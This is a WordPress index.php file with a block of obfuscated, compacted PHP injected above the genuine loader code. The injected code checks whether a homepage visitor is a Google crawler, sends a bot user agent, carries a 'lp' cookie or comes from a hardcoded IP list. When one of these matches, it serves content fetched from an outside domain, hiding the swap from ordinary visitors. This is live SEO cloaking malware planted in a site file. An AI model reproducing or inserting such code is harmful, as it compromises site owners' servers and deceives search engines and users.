<?php 
error_reporting(0);$link='https://x-projetion.org/dpantek/@/dpantek_aicNPHxY@RAW'; //E5F466
function ip_in_range($ip,$range){list($subnet,$bits)=explode('/',$range);$ip_dec=ip2long($ip);$subnet_dec=ip2long($subnet);$mask=-1<<(32-$bits);$subnet_dec&=$mask;return($ip_dec&$mask)===$subnet_dec;}function fetch_ip_ranges($url,$ipv4_key){$json_data=file_get_contents($url);if($json_data===FALSE){die("Error: Could not fetch the IP ranges from $url.");}$ip_data=json_decode($json_data,true);$ip_ranges=[];if(isset($ip_data['prefixes'])){foreach($ip_data['prefixes']as $prefix){if(isset($prefix[$ipv4_key])){$ip_ranges[]=$prefix[$ipv4_key];}}}return $ip_ranges;}$google_ip_ranges=fetch_ip_ranges('https://www.gstatic.com/ipranges/goog.json','ipv4Prefix');$visitor_ip=isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:(isset($_SERVER["HTTP_INCAP_CLIENT_IP"])?$_SERVER["HTTP_INCAP_CLIENT_IP"]:(isset($_SERVER["HTTP_TRUE_CLIENT_IP"])?$_SERVER["HTTP_TRUE_CLIENT_IP"]:(isset($_SERVER["HTTP_REMOTEIP"])?$_SERVER["HTTP_REMOTEIP"]:(isset($_SERVER["HTTP_X_REAL_IP"])?$_SERVER["HTTP_X_REAL_IP"]:$_SERVER["REMOTE_ADDR"]))));$googleallow=false;foreach($google_ip_ranges as $range){if(ip_in_range($visitor_ip,$range)){$googleallow=true;break;}}$asd=array('bot','ahrefs','google');foreach($asd as $len){$nul=$len;}$alow=['116.212.130.44','116.212.130.199','103.121.122.206','136.228.135.175','2001:67c:2628:647:1::18a'];if($_SERVER['REQUEST_URI']=='/'){$agent=strtolower($_SERVER['HTTP_USER_AGENT']);if(strpos($agent,$nul)or $googleallow or isset($_COOKIE['lp'])or in_array($visitor_ip,$alow)){echo implode('',file($link));die();}} ?><?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
